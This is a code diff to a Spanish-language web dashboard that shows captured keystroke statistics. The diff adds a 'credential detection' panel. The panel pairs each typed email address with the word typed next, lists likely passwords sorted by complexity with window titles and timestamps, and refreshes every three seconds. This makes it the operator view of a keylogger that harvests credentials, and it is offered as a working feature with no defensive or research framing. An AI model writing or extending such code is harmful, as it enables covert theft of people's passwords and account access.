@@ -88,6 +88,33 @@
   .muted { color: var(--muted); font-size: 12px; }
   .word { font-family: ui-monospace, SF Mono, Consolas, monospace; }
 
+  /* Badges de complejidad */
+  .badge {
+    display: inline-block;
+    padding: 2px 8px;
+    border-radius: 4px;
+    font-size: 11px;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.03em;
+  }
+  .badge.strong     { background: #f7768e33; color: #f7768e; }
+  .badge.mixed      { background: #e0af6833; color: #e0af68; }
+  .badge.alpha      { background: #7aa2f733; color: #7aa2f7; }
+  .badge.email      { background: #9ece6a33; color: #9ece6a; }
+
+  /* Seccion especial de seguridad */
+  .security-section {
+    margin-top: 24px;
+    border-top: 2px solid #f7768e44;
+    padding-top: 20px;
+  }
+  .security-section > h2 {
+    color: #f7768e;
+    font-size: 16px;
+    margin: 0 0 16px;
+  }
+
   /* Grafico de pulsaciones por hora */
   .hour-chart {
     display: grid;
@@ -172,6 +199,49 @@
         <thead><tr><th>Longitud</th><th class="n">Veces</th><th>Gráfico</th></tr></thead>
         <tbody></tbody>
       </table>
+    </div>
+  </div>
+
+  <!-- ====== SECCION DE SEGURIDAD ====== -->
+  <div class="security-section">
+    <h2>🔐 Detección de credenciales</h2>
+
+    <div class="kpis" id="sec-kpis"></div>
+    <div style="height:16px"></div>
+
+    <div class="grid">
+      <div class="card" style="grid-column: 1 / -1;">
+        <h2>Emails detectados + palabra siguiente</h2>
+        <table id="credentials">
+          <thead><tr><th>#</th><th>Email</th><th>Palabra siguiente</th><th>Ventana</th><th>Fecha</th></tr></thead>
+          <tbody></tbody>
+        </table>
+      </div>
+
+      <div class="card">
+        <h2>Posibles contraseñas — Fuertes</h2>
+        <p class="muted">Mayúscula + minúscula + número + carácter especial</p>
+        <table id="pw-strong">
+          <thead><tr><th>#</th><th>Palabra</th><th>Ventana</th><th>Fecha</th></tr></thead>
+          <tbody></tbody>
+        </table>
+      </div>
+      <div class="card">
+        <h2>Posibles contraseñas — Medias</h2>
+        <p class="muted">Mayúscula + minúscula + número</p>
+        <table id="pw-mixed">
+          <thead><tr><th>#</th><th>Palabra</th><th>Ventana</th><th>Fecha</th></tr></thead>
+          <tbody></tbody>
+        </table>
+      </div>
+      <div class="card">
+        <h2>Posibles contraseñas — Alfanuméricas</h2>
+        <p class="muted">Letras + números</p>
+        <table id="pw-alpha">
+          <thead><tr><th>#</th><th>Palabra</th><th>Ventana</th><th>Fecha</th></tr></thead>
+          <tbody></tbody>
+        </table>
+      </div>
     </div>
   </div>
 
@@ -287,7 +357,7 @@ async function loadAll() {
         i + 1,
         { html: '<span class="word">' + esc(r.word) + '</span>' },
         { html: r.count, cls: 'n' },
-        { html: '<span class="bar" style="width:' + pct.toFixed(1) + 'px"></span>' }
+        { html: '<span class="bar" style="width:' + Math.max(pct, 4).toFixed(1) + '%"></span>' }
       ]));
     });
     if (top.length === 0) tb.appendChild(row([{ html: '<span class="muted">sin datos</span>' }, '', '', '']));
@@ -313,7 +383,7 @@ async function loadAll() {
       tbl.appendChild(row([
         r.length,
         { html: r.count, cls: 'n' },
-        { html: '<span class="bar alt" style="width:' + pct.toFixed(1) + 'px"></span>' }
+        { html: '<span class="bar alt" style="width:' + Math.max(pct, 4).toFixed(1) + '%"></span>' }
       ]));
     });
 
@@ -323,25 +393,87 @@ async function loadAll() {
   }
 }
 
-$('refresh').addEventListener('click', loadAll);
+$('refresh').addEventListener('click', loadEverything);
 $('clear-dates').addEventListener('click', () => {
   $('from').value = '';
   $('to').value = '';
-  loadAll();
+  loadEverything();
 });
 $('flush').addEventListener('click', async () => {
   $('status').textContent = 'flushing…';
   await fetch('/api/stats/flush', { method: 'POST' });
-  loadAll();
+  loadEverything();
 });
 ['host', 'limit', 'from', 'to'].forEach(id => {
-  $(id).addEventListener('keydown', e => { if (e.key === 'Enter') loadAll(); });
+  $(id).addEventListener('keydown', e => { if (e.key === 'Enter') loadEverything(); });
 });
-$('from').addEventListener('change', loadAll);
-$('to').addEventListener('change', loadAll);
+$('from').addEventListener('change', loadEverything);
+$('to').addEventListener('change', loadEverything);
 
-loadAll();
-setInterval(loadAll, 15000);
+async function loadSecurity() {
+  const q = qs();
+  try {
+    const [creds, pwSummary, pwStrong, pwMixed, pwAlpha] = await Promise.all([
+      j('/api/stats/credentials?' + q),
+      j('/api/stats/password-summary?' + q),
+      j('/api/stats/password-patterns?' + qs({ complexity: 'strong' })),
+      j('/api/stats/password-patterns?' + qs({ complexity: 'mixed-case-num' })),
+      j('/api/stats/password-patterns?' + qs({ complexity: 'alphanumeric' }))
+    ]);
+
+    // KPIs de seguridad
+    const countOf = (name) => (pwSummary.patterns.find(p => p.complexity === name) || {}).count || 0;
+    $('sec-kpis').innerHTML = `
+      <div class="kpi"><div class="n" style="color:#9ece6a">${pwSummary.emailCount}</div><div class="l">emails detectados</div></div>
+      <div class="kpi"><div class="n" style="color:#f7768e">${countOf('strong')}</div><div class="l">contraseñas fuertes</div></div>
+      <div class="kpi"><div class="n" style="color:#e0af68">${countOf('mixed-case-num')}</div><div class="l">contraseñas medias</div></div>
+      <div class="kpi"><div class="n" style="color:#7aa2f7">${countOf('alphanumeric')}</div><div class="l">alfanuméricas</div></div>
+    `;
+
+    // Credenciales
+    const tbc = clear('credentials');
+    creds.forEach((r, i) => {
+      const ts = new Date(r.timestamp).toLocaleString();
+      tbc.appendChild(row([
+        i + 1,
+        { html: '<span class="word">' + esc(r.email) + '</span> <span class="badge email">email</span>' },
+        { html: r.nextWord ? '<span class="word">' + esc(r.nextWord) + '</span>' : '<span class="muted">—</span>' },
+        r.window || '(sin título)',
+        { html: '<span class="muted">' + ts + '</span>' }
+      ]));
+    });
+    if (creds.length === 0) tbc.appendChild(row([{ html: '<span class="muted">sin datos</span>' }, '', '', '', '']));
+
+    // Tablas de contraseñas
+    function fillPwTable(id, data, badgeCls, badgeText) {
+      const tb = clear(id);
+      data.forEach((r, i) => {
+        const ts = new Date(r.timestamp).toLocaleString();
+        tb.appendChild(row([
+          i + 1,
+          { html: '<span class="word">' + esc(r.word) + '</span> <span class="badge ' + badgeCls + '">' + badgeText + '</span>' },
+          r.window || '(sin título)',
+          { html: '<span class="muted">' + ts + '</span>' }
+        ]));
+      });
+      if (data.length === 0) tb.appendChild(row([{ html: '<span class="muted">sin datos</span>' }, '', '', '']));
+    }
+
+    fillPwTable('pw-strong', pwStrong, 'strong', 'fuerte');
+    fillPwTable('pw-mixed', pwMixed, 'mixed', 'media');
+    fillPwTable('pw-alpha', pwAlpha, 'alpha', 'alfanum');
+
+  } catch (e) {
+    console.error('loadSecurity:', e);
+  }
+}
+
+async function loadEverything() {
+  await Promise.all([loadAll(), loadSecurity()]);
+}
+
+loadEverything();
+setInterval(loadEverything, 3000);
 </script>
 </body>
 </html>
